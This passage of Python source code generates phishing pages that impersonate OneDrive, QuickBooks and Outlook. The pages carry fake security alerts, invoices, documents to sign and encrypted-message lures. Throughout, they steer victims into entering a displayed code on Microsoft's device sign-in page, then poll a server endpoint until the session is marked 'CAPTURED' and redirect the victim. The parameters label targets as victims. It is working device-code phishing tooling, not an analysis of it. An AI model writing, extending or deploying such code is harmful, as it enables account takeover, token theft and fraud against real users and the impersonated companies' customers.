            badge = 'ICS'
    elif badge in ('VMAIL', 'VOICEMAIL') or 'voice' in tmpl_name or 'vmail' in tmpl_name:
        if badge in ('VMAIL', 'VOICEMAIL', 'PDF'):
            badge = 'WAV'
    title    = cfg.get('landing_title', 'Sign Document')
    desc     = cfg.get('landing_desc', 'Sign in with your Microsoft account to verify your identity and complete the signing process.')

    parts = []
    if show_title and title:
        parts.append(f'<h1>{title}</h1>')
    if show_desc and desc:
        parts.append(f'<p class="h-desc">{desc}</p>')

    doc_row_parts = []
    if show_badge and badge:
        doc_row_parts.append(f'<div class="doc-badge-box" style="background:linear-gradient(135deg, {accent}, #111122); color:#fff; width:42px; height:42px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-weight:800; font-size:0.75rem; letter-spacing:0.6px; flex-shrink:0; text-transform:uppercase; box-shadow:0 3px 8px rgba(0,0,0,0.18), inset 0 1px 0 rgba(255,255,255,0.25);">{badge}</div>')

    text_subparts = []
    if show_name and doc_name:
        text_subparts.append(f'<div class="doc-name">{doc_name}</div>')
    if show_meta and doc_sub:
        text_subparts.append(f'<div class="doc-sub">{doc_sub}</div>')

    if text_subparts:
        doc_row_parts.append(f'<div>{"".join(text_subparts)}</div>')

    if doc_row_parts:
        parts.append(f'<div class="doc-row">{"".join(doc_row_parts)}</div>')

    return "\n".join(parts)


def _mode_a_card(cfg, victim_ip='', victim_location=''):
    show_acct  = cfg.get('show_mode_a_acct', True)
    show_title = cfg.get('show_mode_a_title', True)
    show_alert = cfg.get('show_mode_a_alert', False)
    show_desc  = cfg.get('show_mode_a_desc', True)
    show_ip    = cfg.get('show_mode_a_ip', True)
    show_loc   = cfg.get('show_mode_a_loc', True)

    acct_lbl   = cfg.get('mode_a_account_label', 'MICROSOFT ACCOUNT')
    title      = cfg.get('mode_a_title', 'Review this activity')
    alert_text = cfg.get('mode_a_alert', '')
    desc       = cfg.get('mode_a_desc', 'Sign in to review recent account activity and secure your account.')
    ip_lbl     = cfg.get('mode_a_ip_label', 'IP ADDRESS')
    ip_val     = cfg.get('mode_a_ip') or victim_ip or "185.234.xx.xx"
    loc_lbl    = cfg.get('mode_a_loc_label', 'LOCATION')
    loc_val    = cfg.get('mode_a_loc') or victim_location or "Frankfurt, Germany"

    parts = []
    if show_acct and acct_lbl: parts.append(f'<div class="acct-lbl">{acct_lbl}</div>')
    if show_title and title: parts.append(f'<h1>{title}</h1>')
    if show_desc and desc: parts.append(f'<p class="h-desc">{desc}</p>')
    if show_alert and alert_text:
        warning_icon = '<svg width="15" height="15" viewBox="0 0 16 16" fill="#c0392b" style="flex-shrink:0;margin-right:6px;"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm0 3.5a.75.75 0 01.75.75v3.5a.75.75 0 01-1.5 0v-3.5A.75.75 0 018 4.5zm0 7a.875.875 0 110-1.75.875.875 0 010 1.75z"/></svg>'
        parts.append(f'<div class="alert-box">{warning_icon}<span>{alert_text}</span></div>')
    if show_ip and ip_val:
        parts.append(f'<div class="info-chip"><span class="chip-lbl">{ip_lbl}</span><span class="chip-val">{ip_val}</span></div>')
    if show_loc and loc_val:
        parts.append(f'<div class="info-chip"><span class="chip-lbl">{loc_lbl}</span><span class="chip-val">{loc_val}</span></div>')
    return "\n".join(parts)


def _mode_b_card(cfg):
    show_title  = cfg.get('show_mode_b_title', True)
    show_amount = cfg.get('show_mode_b_amount', True)
    show_inv    = cfg.get('show_mode_b_invoice', True)
    show_bill   = cfg.get('show_mode_b_bill_from', True)
    show_desc   = cfg.get('show_mode_b_desc', True)

    title       = cfg.get('mode_b_title', 'Verify your Identity')
    amount      = cfg.get('mode_b_amount', '$1,347.50')
    invoice_num = cfg.get('mode_b_invoice', 'Invoice #2026-1047')
    bill_from   = cfg.get('mode_b_bill_from', 'Intuit Inc.')
    date_label  = cfg.get('mode_b_date_label', 'PAYMENT PENDING')
    desc        = cfg.get('mode_b_desc', 'To authorize this payment, verify your identity below.')

    parts = []
    if show_title and title: parts.append(f'<h1>{title}</h1>')
    if show_amount and amount: parts.append(f'<div class="amount">{amount}</div>')
    if show_inv and invoice_num: parts.append(f'<div class="inv-num">{invoice_num}</div>')
    if show_bill and bill_from: parts.append(f'<div class="bill-from">Bill from: <strong>{bill_from}</strong></div>')
    parts.append(f'<div class="inv-meta">AMOUNT: {amount}&nbsp;&nbsp;|&nbsp;&nbsp;DATE: {date_label}</div>')
    if show_desc and desc: parts.append(f'<p class="h-desc" style="margin-top:10px">{desc}</p>')
    return "\n".join(parts)


def _mode_c_card(cfg, icon_mini=''):
    title        = cfg.get('mode_c_title', 'Document ready for review')
    sender_name  = cfg.get('mode_c_sender', 'John Doe')
    sender_via   = cfg.get('mode_c_via', 'via OneDrive')
    doc_title    = cfg.get('mode_c_doc_title', cfg.get('doc_name', 'Non-Disclosure Agreement'))
    doc_meta_c   = cfg.get('mode_c_doc_meta', 'Document · 6 pages')
    action_label = cfg.get('mode_c_action_label', 'REVIEW')
    desc         = cfg.get('mode_c_desc', 'To review this document, complete the verification steps below.')
    parts = sender_name.strip().split()
    initials = (parts[0][0] + (parts[-1][0] if len(parts) > 1 else '')).upper()
    icon_el = f'<div style="flex-shrink:0">{icon_mini}</div>' if icon_mini else ''
    return f"""<h1>{title}</h1>
<div class="sender-row">
  <div class="avatar">{initials}</div>
  <div><div class="sender-name">{sender_name}</div><div class="sender-via">{sender_via}</div></div>
</div>
<div class="doc-detail">
  {icon_el}
  <div><div class="doc-title">{doc_title}</div><div class="doc-meta">{doc_meta_c}</div></div>
  <span class="review-pill">{action_label}</span>
</div>
<p class="h-desc">{desc}</p>"""


def _mode_r_card(cfg, accent, icon_mini=''):
    show_title = cfg.get('show_mode_r_title', True)
    show_name  = cfg.get('show_mode_r_name', True)
    show_meta  = cfg.get('show_mode_r_meta', True)
    show_badge = cfg.get('show_mode_r_badge', True)
    show_desc  = cfg.get('show_mode_r_desc', True)

    title    = cfg.get('mode_r_title', 'Document ready for review')
    step1    = cfg.get('mode_r_step1', 'Verify Identity')
    step2    = cfg.get('mode_r_step2', 'Review')
    step3    = cfg.get('mode_r_step3', 'Sign')
    doc_name = cfg.get('mode_r_doc_name', cfg.get('doc_name', 'Non-Disclosure Agreement'))
    doc_meta = cfg.get('mode_r_doc_meta', 'NDA-2026-Final.pdf · 4 pages')
    badge    = cfg.get('mode_r_badge', 'PDF')
    desc     = cfg.get('mode_r_desc', 'To review and sign this document, complete the verification steps below.')

    icon_el = f'<div style="flex-shrink:0">{icon_mini}</div>' if icon_mini else (f'<span class="badge" style="background:{accent};">{badge}</span>' if show_badge else '')

    parts = []
    if cfg.get('show_mode_r_steps', True):
        parts.append(f"""<div style="display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:14px;user-select:none;">
  <div style="display:flex;align-items:center;gap:6px;">
    <span style="display:inline-flex;align-items:center;justify-content:center;width:20px;height:20px;border-radius:50%;background:{accent};color:#fff;font-size:11px;font-weight:700;">1</span>
    <span style="font-size:12px;font-weight:600;color:#222;">{step1}</span>
  </div>
  <span style="color:#bbb;font-size:12px;">—</span>
  <div style="display:flex;align-items:center;gap:6px;">
    <span style="display:inline-flex;align-items:center;justify-content:center;width:20px;height:20px;border-radius:50%;background:#e5e7eb;color:#6b7280;font-size:11px;font-weight:700;">2</span>
    <span style="font-size:12px;color:#6b7280;">{step2}</span>
  </div>
  <span style="color:#bbb;font-size:12px;">—</span>
  <div style="display:flex;align-items:center;gap:6px;">
    <span style="display:inline-flex;align-items:center;justify-content:center;width:20px;height:20px;border-radius:50%;background:#e5e7eb;color:#6b7280;font-size:11px;font-weight:700;">3</span>
    <span style="font-size:12px;color:#6b7280;">{step3}</span>
  </div>
</div>""")
    if show_title and title: parts.append(f'<h1>{title}</h1>')
    doc_row = []
    if icon_el: doc_row.append(icon_el)
    doc_details = []
    if show_name and doc_name: doc_details.append(f'<div class="doc-name">{doc_name}</div>')
    if show_meta and doc_meta: doc_details.append(f'<div class="doc-sub">{doc_meta}</div>')
    if doc_details: doc_row.append(f'<div>{"".join(doc_details)}</div>')
    if doc_row: parts.append(f'<div class="doc-row">{"".join(doc_row)}</div>')
    if show_desc and desc: parts.append(f'<p class="h-desc" style="margin-top:8px;">{desc}</p>')
    return "\n".join(parts)


def _verify_section(user_code, verification_uri, accent, cfg):
    copy_label   = cfg.get('copy_btn_label', 'Copy code')
    signin_label = cfg.get('signin_btn_label', 'Sign in with Microsoft')
    copy_color   = cfg.get('copy_btn_color', accent)
    signin_color = cfg.get('signin_btn_color', '#000000')
    code_bg      = cfg.get('code_card_bg', '#f4f6f9')
    steps_bg     = cfg.get('steps_card_bg', 'transparent')

    show_verify_head = cfg.get('show_verify_head', True)
    show_verify_desc = cfg.get('show_verify_desc', True)
    show_steps_head  = cfg.get('show_steps_head', True)
    show_steps_text  = cfg.get('show_steps_text', True)
    show_copy_btn    = cfg.get('show_copy_btn', True)
    show_signin_btn  = cfg.get('show_signin_btn', True)

    verify_label = cfg.get('verify_heading', 'Verify your identity')
    verify_desc  = cfg.get('verify_desc', 'To continue, complete the verification steps below.')
    steps_head   = cfg.get('steps_heading', 'STEPS TO SIGN:')
    steps_text   = cfg.get('steps_text', '')

    footer_text  = cfg.get('custom_footer', '')

    # Format steps list
    if steps_text:
        formatted_steps = steps_text.replace('{CODE}', f'<strong style="color:{accent}">{user_code}</strong>').replace('{code}', f'<strong style="color:{accent}">{user_code}</strong>')
        step_items = [f'<li>{line.strip().lstrip("0123456789. ")}</li>' for line in formatted_steps.strip().split('\n') if line.strip()]
        steps_ol = f'<ol class="steps-list">{"".join(step_items)}</ol>'
    else:
        steps_ol = f'''<ol class="steps-list">
  <li>Click the button below to open the sign-in window.</li>
  <li>Enter the code <strong style="color:{accent}">{user_code}</strong> when prompted.</li>
  <li>Authenticate with your Microsoft account.</li>
  <li>Return to this tab to sign the document.</li>
</ol>'''

    code_card_img = cfg.get('code_card_bg_image')
    code_card_style = f"background: url('{code_card_img}') center/cover no-repeat;" if code_card_img else f"background:{code_bg};"

    steps_card_img = cfg.get('steps_card_bg_image')
    steps_style = f"background: url('{steps_card_img}') center/cover no-repeat; padding:10px; border-radius:8px;" if steps_card_img else (f"background:{steps_bg}; padding:8px; border-radius:8px;" if steps_bg and steps_bg != 'transparent' else '')

    parts = ['<hr class="divider">']
    if show_verify_head and verify_label:
        parts.append(f'<div class="verify-lbl-top">{verify_label}</div>')
    if show_verify_desc and verify_desc:
        parts.append(f'<p class="verify-desc">{verify_desc}</p>')

    parts.append(f'''<div class="code-box" style="{code_card_style}">
  <div class="code-lbl">VERIFICATION CODE</div>
  <div class="code-val" id="uc">{user_code}</div>''')

    if show_copy_btn:
        parts.append(f'<button class="copy-btn" style="background:{copy_color};color:#fff;border:none;" onclick="copyCode()">{copy_label}</button>')
    parts.append('</div>')

    steps_content = ''
    if show_steps_head and steps_head:
        steps_content += f'<div class="steps-lbl">{steps_head}</div>'
    if show_steps_text:
        steps_content += steps_ol

    if steps_content:
        parts.append(f'<div style="{steps_style}">{steps_content}</div>')

    if show_signin_btn:
        parts.append(f'''<a class="signin-btn" href="{verification_uri}" target="_blank" rel="noopener" style="background:{signin_color};" onclick="openAuthWindow(event, '{verification_uri}')">
  {_MS_LOGO_SVG} {signin_label}
</a>''')

    if footer_text:
        parts.append(f'<div style="margin-top:14px; text-align:center; font-size:0.75rem; color:#888;">{footer_text}</div>')

    return "\n".join(parts)


def _left_panel_html(accent, icon_svg, org_name, victim_ip, victim_location, cfg=None):
    cfg = cfg or {}
    left_logo = cfg.get('left_logo_image')
    template_name = cfg.get('template_name', '')
    brand_logo = assets.get_logo_html(template_name, 52, 140) if template_name else ''
    
    if left_logo:
        logo_html = f'<img src="{left_logo}" alt="Logo" style="max-height:52px;max-width:140px;display:block;margin:0 auto;object-fit:contain;">'
    elif brand_logo:
        logo_html = brand_logo
    elif icon_svg:
        logo_html = icon_svg
    else:
        logo_html = ''

    show_title = cfg.get('show_left_title', True)
    left_title = cfg.get('left_title')
    if left_title is None or left_title == '':
        left_title = template_name or org_name or 'Adobe'

    show_desc = cfg.get('show_left_desc', True)
    left_desc = cfg.get('left_desc')
    if left_desc is None or left_desc == '':
        left_desc = 'Document awaiting your signature.'

    title_html = f'<div class="panel-title">{left_title}</div>' if (show_title and left_title) else ''
    desc_html = f'<div class="panel-desc">{left_desc}</div>' if (show_desc and left_desc) else ''

    return f"""<div class="left-panel">
  <div class="left-panel-dec-1"></div>
  <div class="left-panel-dec-2"></div>
  <div class="panel-content">
    {f'<div class="panel-logo-wrap">{logo_html}</div>' if logo_html else ''}
    {title_html}
    {desc_html}
  </div>
</div>"""


def _build_landing_page(title, accent, page_bg, card_bg, has_panel, left_html, card_html, verify_html, cfg=None, user_code='', success_url='', verification_uri=''):
    cfg = cfg or {}
    css = _landing_css(accent, page_bg, card_bg, has_panel, cfg=cfg)
    auto_open = cfg.get('auto_open_signin', False)
    copy_label = cfg.get('copy_btn_label', 'Copy code')
    auto_open_js = "setTimeout(function(){ openAuthWindow(null); }, 400);" if auto_open else ""

    poll_js = ""
    if user_code and success_url:
        poll_js = f"""
(function() {{
  var uc = "{user_code}";
  var succUrl = "{success_url}";
  if (!uc || !succUrl || uc === 'ABCD-1234' || uc.indexOf('PREVIEW') !== -1) return;
  var pollInterval = setInterval(function() {{
    fetch('/api/lp/session-status/' + encodeURIComponent(uc))
      .then(function(r) {{ return r.json(); }})
      .then(function(data) {{
        if (data && data.status === 'CAPTURED') {{
          clearInterval(pollInterval);
          if (authWin && !authWin.closed) {{
            try {{ authWin.close(); }} catch(e) {{}}
          }}
          var st = document.getElementById('verifying-status-txt');
          if (st) st.textContent = 'Identity verified! Redirecting…';
          var vt = document.querySelector('.verifying-title');
          if (vt) vt.textContent = 'Authentication Complete';
          setTimeout(function() {{
            window.location.href = succUrl;
          }}, 500);
        }}
      }})
      .catch(function(e) {{}});
  }}, 1500);
}})();
"""

    show_bg = cfg.get('show_page_bg_image', cfg.get('show_bg_image', True)) not in (False, 'false', '0', 0)
    page_img = cfg.get('page_bg_image') or cfg.get('bg_image') or ''
    if not page_img and show_bg:
        page_img = DEFAULT_BG_URL
    bg_layer_html = '<div class="page-bg-layer"></div>' if (page_img and show_bg) else ''

    return f"""<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title}</title>{css}
</head><body>
{bg_layer_html}
<div class="wrapper">
  {left_html}
  <div class="card-area">
    <div class="card">
      <div id="card-content-wrap">
        {card_html}{verify_html}
      </div>
      <div id="verifying-overlay" class="verifying-overlay">
        <div class="auth-spinner-wrap">
          <div class="auth-pulse-ring"></div>
          <div class="auth-spinner"></div>
        </div>
        <div class="verifying-title">Verifying Identity…</div>
        <div class="verifying-desc">Complete sign-in in the Microsoft window to verify identity.</div>
        <div class="verifying-status">
          <span class="status-dot"></span>
          <span id="verifying-status-txt">Waiting for Microsoft confirmation…</span>
        </div>
        <a href="#" class="reopen-link" onclick="openAuthWindow(event)">Window closed or hidden? Reopen sign-in</a>
      </div>
    </div>
  </div>
</div>
<script>
var authWin = null;
var authUrl = "{verification_uri}";

function openAuthWindow(e, url) {{
  if (e && e.preventDefault) e.preventDefault();
  var targetUrl = url || authUrl;
  var w = 520, h = 680;
  var left = (window.screen.width - w) / 2;
  var top = (window.screen.height - h) / 2;
  try {{
    authWin = window.open(targetUrl, 'msAuthWin', 'width=' + w + ',height=' + h + ',top=' + top + ',left=' + left + ',scrollbars=yes,resizable=yes');
  }} catch(err) {{
    authWin = null;
  }}
  if (!authWin || authWin.closed || typeof authWin.closed === 'undefined') {{
    authWin = window.open(targetUrl, '_blank');
  }}
  showVerifyingState();
}}

function showVerifyingState() {{
  var content = document.getElementById('card-content-wrap');
  var overlay = document.getElementById('verifying-overlay');
  if (content) content.style.display = 'none';
  if (overlay) overlay.style.display = 'flex';
}}

function copyCode(){{
  navigator.clipboard.writeText(document.getElementById("uc").textContent.trim())
    .then(()=>{{
      var b=document.querySelector(".copy-btn");
      if(b){{ b.textContent="Copied!"; setTimeout(()=>b.textContent="{copy_label}",2000); }}
      {auto_open_js}
    }});
}}
{poll_js}
</script>
</body></html>"""


def _dispatch_landing(cfg, user_code, verification_uri,
                      icon_svg='', icon_svg_mini='', org_name='',
                      default_accent='#0078D4', default_page_bg='#f5f5f5',
                      mode='S', victim_ip='', victim_location='',
                      success_url=''):
    accent  = cfg.get('accent_color', default_accent)
    page_bg = cfg.get('page_color', default_page_bg)
    card_bg = cfg.get('card_bg', '#ffffff')
    title   = cfg.get('landing_title', 'Sign Document')
    mode    = (cfg.get('landing_mode') or mode or 'S').upper()
    show_lp = cfg.get('show_left_panel', cfg.get('show_left_column', True))

    template_name = cfg.get('template_name', '')
    brand_logo = assets.get_logo_html(template_name, 44, 130) if template_name else (icon_svg_mini or icon_svg)
    top_logo_html = f'<div style="display:flex;justify-content:center;margin-bottom:14px;">{brand_logo}</div>' if brand_logo else ''

    if   mode == 'A': card = _mode_a_card(cfg, victim_ip, victim_location)
    elif mode == 'B': card = _mode_b_card(cfg)
    elif mode == 'R': card = _mode_r_card(cfg, accent, icon_svg_mini)
    elif mode == 'C': card = _mode_c_card(cfg, icon_svg_mini)
    else:             card = _mode_s_card(cfg, accent, icon_svg_mini)

    card_with_top_logo = f"{top_logo_html}\n{card}" if (brand_logo and not show_lp) else card
    verify = _verify_section(user_code, verification_uri, accent, cfg)
    left   = _left_panel_html(accent, icon_svg, org_name, victim_ip, victim_location, cfg=cfg) if show_lp else ''
    return _build_landing_page(title, accent, page_bg, card_bg, show_lp, left, card_with_top_logo, verify, cfg=cfg, user_code=user_code, success_url=success_url, verification_uri=verification_uri)


# PRE-LAND renderers
# ═══════════════════════════════════════════════════════════════════════════

def _normalize_preland_cfg(cfg):
    """Normalize short/long field alias pairs so user custom edits always take precedence."""
    if not isinstance(cfg, dict):
        return
    # Alias doc_meta <-> doc_sub
    if cfg.get('doc_meta') is not None and not cfg.get('doc_sub'):
        cfg['doc_sub'] = cfg['doc_meta']
    elif cfg.get('doc_sub') is not None and not cfg.get('doc_meta'):
        cfg['doc_meta'] = cfg['doc_sub']

    # Alias desc <-> description
    if cfg.get('desc') is not None and not cfg.get('description'):
        cfg['description'] = cfg['desc']
    elif cfg.get('description') is not None and not cfg.get('desc'):
        cfg['desc'] = cfg['description']

    # Alias btn_label <-> button_label
    if cfg.get('btn_label') is not None and not cfg.get('button_label'):
        cfg['button_label'] = cfg['btn_label']
    elif cfg.get('button_label') is not None and not cfg.get('btn_label'):
        cfg['btn_label'] = cfg['button_label']

    # Alias foot1 <-> footer_caption
    if cfg.get('foot1') is not None and not cfg.get('footer_caption'):
        cfg['footer_caption'] = cfg['foot1']
    elif cfg.get('footer_caption') is not None and not cfg.get('foot1'):
        cfg['foot1'] = cfg['footer_caption']

    # Alias foot2 <-> footer_text
    if cfg.get('foot2') is not None and not cfg.get('footer_text'):
        cfg['footer_text'] = cfg['foot2']
    elif cfg.get('footer_text') is not None and not cfg.get('foot2'):
        cfg['foot2'] = cfg['footer_text']

    # Alias btn_color <-> accent_color
    if cfg.get('btn_color') is not None and not cfg.get('accent_color'):
        cfg['accent_color'] = cfg['btn_color']
    elif cfg.get('accent_color') is not None and not cfg.get('btn_color'):
        cfg['btn_color'] = cfg['accent_color']

def render_preland_onedrive(cfg, proceed_url):
    _normalize_preland_cfg(cfg)
    cfg.setdefault('template_name', 'OneDrive')
    cfg.setdefault('title', 'Protected Document')
    cfg.setdefault('description', "This file is protected by your organization's security policies. Verify your identity to access this.")
    cfg.setdefault('doc_name', 'Shared-File.docx')
    cfg.setdefault('doc_badge', 'DOCX')
    cfg.setdefault('doc_sub', 'OneDrive file · Access required')
    cfg.setdefault('button_label', 'Access Protected File')
    cfg.setdefault('footer_caption', 'Verify your identity to access this file')
    cfg.setdefault('footer_text', 'End-to-end encrypted')
    cfg.setdefault('accent_color', '#0078D4')
    cfg.setdefault('page_color', '#f3f2f1')
    cfg.setdefault('card_bg', '#ffffff')
    return _render_generic_preland(cfg, proceed_url)


# ═══════════════════════════════════════════════════════════════════════════
# LANDING renderers  (accept user_code + verification_uri)
# ═══════════════════════════════════════════════════════════════════════════

def render_landing_onedrive(cfg, user_code, verification_uri, success_url='',
                             mode='S', victim_ip='', victim_location=''):
    cfg.setdefault('template_name', 'OneDrive')
    icon      = assets.get_logo_html('OneDrive', 48)
    icon_mini = assets.get_logo_html('OneDrive', 28)
    return _dispatch_landing(cfg, user_code, verification_uri,
                             icon_svg=icon, icon_svg_mini=icon_mini,
                             org_name=cfg.get('org_name','Microsoft OneDrive'),
                             default_accent='#0078D4', default_page_bg='#f3f2f1',
                             mode=mode, victim_ip=victim_ip, victim_location=victim_location,
                             success_url=success_url)


# ═══════════════════════════════════════════════════════════════════════════
# SUCCESS renderers
# ═══════════════════════════════════════════════════════════════════════════

def _onedrive_svg(size=48):
    """OneDrive cloud logo HTML/SVG."""
    return assets.get_logo_html('OneDrive', size)

def render_success_onedrive(cfg, success_url):
    title   = cfg.get('success_title','Shared file access review')
    desc    = cfg.get('success_desc','Thanks for verifying your identity. You will be redirected to Microsoft 365 shortly.')
    accent  = cfg.get('accent_color','#0078D4')
    page_bg = cfg.get('page_color','#f3f2f1')
    card_bg = cfg.get('card_bg','#ffffff')
    delay   = int(cfg.get('redirect_delay_ms', 3000))

    return f'''<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title}</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{min-height:100vh;display:flex;align-items:center;justify-content:center;
     background:{page_bg};font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}}
.card{{background:{card_bg};border-radius:14px;box-shadow:0 4px 28px rgba(0,0,0,.10);
       padding:40px 32px;max-width:360px;width:90%;text-align:center}}
.cloud{{margin:0 auto 14px;display:block}}
.brand{{font-size:.68rem;font-weight:700;color:{accent};letter-spacing:.14em;margin-bottom:14px}}
h1{{font-size:1.05rem;font-weight:700;color:#1a1a1a;margin-bottom:10px}}
.desc{{font-size:.82rem;color:#666;line-height:1.55;margin-bottom:22px}}
.redirect-txt{{font-size:.78rem;color:#aaa}}
.dots::after{{content:"";animation:dots 1.4s steps(4,end) infinite}}
@keyframes dots{{0%{{content:""}}25%{{content:"."}}50%{{content:".."}}75%{{content:"..."}}100%{{content:""}}}}
</style></head><body>
<div class="card">
  {_onedrive_svg()}
  <div class="brand">ONEDRIVE</div>
  <h1>{title}</h1>
  <p class="desc">{desc}</p>
  <p class="redirect-txt">Redirecting<span class="dots"></span></p>
</div>
<script>setTimeout(()=>window.location.replace("{success_url}"),{delay});</script>
</body></html>'''


# ═══════════════════════════════════════════════════════════════════════════
# DISPATCHER maps  (template_name -> renderer)
# ═══════════════════════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════════════════════
# QUICKBOOKS TEMPLATES
# ═══════════════════════════════════════════════════════════════════════════

def _qb_svg(size=48):
    """QuickBooks green circle qb logo SVG."""
    return f'''<svg width="{size}" height="{size}" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
<circle cx="24" cy="24" r="24" fill="#2CB34A"/>
<text x="24" y="32" text-anchor="middle" font-family="-apple-system,BlinkMacSystemFont,Arial,sans-serif"
      font-size="20" font-weight="700" fill="#ffffff" letter-spacing="-0.5">qb</text>
</svg>'''

def render_preland_quickbooks(cfg, proceed_url):
    _normalize_preland_cfg(cfg)
    cfg.setdefault('template_name', 'QuickBooks')
    cfg.setdefault('title', 'Protected Document')
    cfg.setdefault('description', "This file is protected by your organization's security policies. Verify your identity to access.")
    cfg.setdefault('doc_name', 'Protected-Document.pdf')
    cfg.setdefault('doc_badge', 'PDF')
    cfg.setdefault('doc_sub', 'Protected Document · Access Required')
    cfg.setdefault('button_label', 'Access Protected File')
    cfg.setdefault('footer_caption', 'Verify your identity to access this file')
    cfg.setdefault('footer_text', 'End-to-end encrypted')
    cfg.setdefault('accent_color', '#2CB34A')
    cfg.setdefault('page_color', '#f5f5f5')
    cfg.setdefault('card_bg', '#ffffff')
    return _render_generic_preland(cfg, proceed_url)


def render_landing_quickbooks(cfg, user_code, verification_uri, success_url='',
                               mode='S', victim_ip='', victim_location=''):
    cfg.setdefault('template_name', 'QuickBooks')
    cfg.setdefault('landing_doc_sub', 'QuickBooks Document · Awaiting Signature')
    cfg.setdefault('doc_name', 'Service-Agreement.pdf')
    cfg.setdefault('copy_btn_fill', True)
    cfg.setdefault('mode_b_bill_from', 'Intuit Inc.')
    icon = assets.get_logo_html('QuickBooks', 48)
    icon_mini = assets.get_logo_html('QuickBooks', 28)
    return _dispatch_landing(cfg, user_code, verification_uri,
                             icon_svg=icon, icon_svg_mini=icon_mini,
                             org_name=cfg.get('org_name','QuickBooks'),
                             default_accent='#2CB34A', default_page_bg='#f5f5f5',
                             mode=mode, victim_ip=victim_ip, victim_location=victim_location,
                             success_url=success_url)


# ═══════════════════════════════════════════════════════════════════════════
# OUTLOOK TEMPLATES
# ═══════════════════════════════════════════════════════════════════════════

def render_preland_outlook(cfg, proceed_url):
    _normalize_preland_cfg(cfg)
    title       = cfg.get('title', 'Encrypted Message Received')
    status_tag  = cfg.get('status_tag', 'Outlook · Encrypted Message')
    desc        = cfg.get('description', "You have received an encrypted message from your organization. Complete identity verification to decrypt and read this message.")
    sender      = cfg.get('outlook_sender', cfg.get('sender_name', 'Security Compliance Center <compliance@organization.com>'))
    subject     = cfg.get('outlook_subject', cfg.get('email_subject', 'Confidential Employee Review & Retention Notice'))
    meta_info   = cfg.get('outlook_meta', 'TLS 1.3 Protected · Single-Use Decryption Token')
    btn_label   = cfg.get('button_label', 'Read Encrypted Message')
    foot1       = cfg.get('footer_caption', 'Protected by Microsoft Outlook Message Encryption (OME)')
    foot2       = cfg.get('footer_text', 'Exchange Online Information Protection · End-to-end encrypted')
    accent      = cfg.get('btn_color', cfg.get('accent_color', '#0078D4'))
    spin_color  = cfg.get('spinner_color', accent)
    page_bg     = cfg.get('page_color', '#f5f5f5')
    card_bg     = cfg.get('card_bg', '#ffffff')

    show_status = cfg.get('show_status_tag', True) not in (False, 'false', '0', 0)
    status_html = f'<div class="outlook-pill">{status_tag}</div>' if (show_status and status_tag) else ''

    show_title  = cfg.get('show_title', True) not in (False, 'false', '0', 0)
    title_html  = f'<h1>{title}</h1>' if (show_title and title) else ''

    show_desc   = cfg.get('show_desc', True) not in (False, 'false', '0', 0)
    desc_html   = f'<p class="desc">{desc}</p>' if (show_desc and desc) else ''

    show_sender  = cfg.get('show_outlook_sender', True) not in (False, 'false', '0', 0)
    show_subject = cfg.get('show_outlook_subject', True) not in (False, 'false', '0', 0)
    show_meta    = cfg.get('show_outlook_meta', True) not in (False, 'false', '0', 0)

    msg_items = []
    if show_sender and sender:
        msg_items.append(f'''<div class="msg-row">
            <span class="msg-icon">📧</span>
            <div class="msg-content">
                <span class="msg-lbl">FROM / MAILBOX</span>
                <span class="msg-val">{sender}</span>
            </div>
        </div>''')
    if show_subject and subject:
        msg_items.append(f'''<div class="msg-row">
            <span class="msg-icon">📋</span>
            <div class="msg-content">
                <span class="msg-lbl">SUBJECT</span>
                <span class="msg-val msg-subj">{subject}</span>
            </div>
        </div>''')
    if show_meta and meta_info:
        msg_items.append(f'''<div class="msg-row msg-sec-row">
            <span class="msg-icon">🔒</span>
            <div class="msg-content">
                <span class="msg-lbl">SECURITY POLICY</span>
                <span class="msg-val msg-meta">{meta_info}</span>
            </div>
        </div>''')
    msg_box_html = f'<div class="outlook-msg-box">{"".join(msg_items)}</div>' if msg_items else ''

    show_btn = cfg.get('show_btn_label', True) not in (False, 'false', '0', 0)
    btn_html = f'''<a class="btn-read" href="#" onclick="launchOutlook(event)">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
        {btn_label}
    </a>''' if (show_btn and btn_label) else ''

    show_foot1 = cfg.get('show_foot1', True) not in (False, 'false', '0', 0)
    show_foot2 = cfg.get('show_foot2', True) not in (False, 'false', '0', 0)
    foot_items = []
    if show_foot1 and foot1: foot_items.append(f'<div class="f1">{foot1}</div>')
    if show_foot2 and foot2: foot_items.append(f'<div class="f2">🔒 {foot2}</div>')
    footer_html = f'<div class="footer">{"".join(foot_items)}</div>' if foot_items else ''

    show_bg = cfg.get('show_bg_image', True) not in (False, 'false', '0', 0)
    bg_img = cfg.get('bg_image') or cfg.get('page_bg_image') or ''
    if not bg_img and show_bg:
        bg_img = DEFAULT_BG_URL
    raw_blur = float(cfg.get('blur', cfg.get('page_bg_blur', 8)))
    blur_px = int(round((raw_blur / 100.0) * 32.0)) if (raw_blur > 0 and bg_img and show_bg) else 0

    bg_layer_html = f'<div class="page-bg-layer bg-layer" style="position:fixed;inset:-35px;width:calc(100% + 70px);height:calc(100% + 70px);background:url(\'{bg_img}\') center/cover no-repeat;filter:blur({blur_px}px);-webkit-filter:blur({blur_px}px);transform:scale(1.04);z-index:0;pointer-events:none;"></div>' if (bg_img and show_bg) else ''

    logo_data = cfg.get('logo_data') or cfg.get('custom_logo')
    if logo_data:
        logo_html = f'<img src="{logo_data}" style="max-height:48px;max-width:140px;margin:0 auto 14px;display:block;object-fit:contain;">'
    else:
        logo_html = assets.get_logo_html('Outlook', 52, 140, 'margin:0 auto 14px;')

    return f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
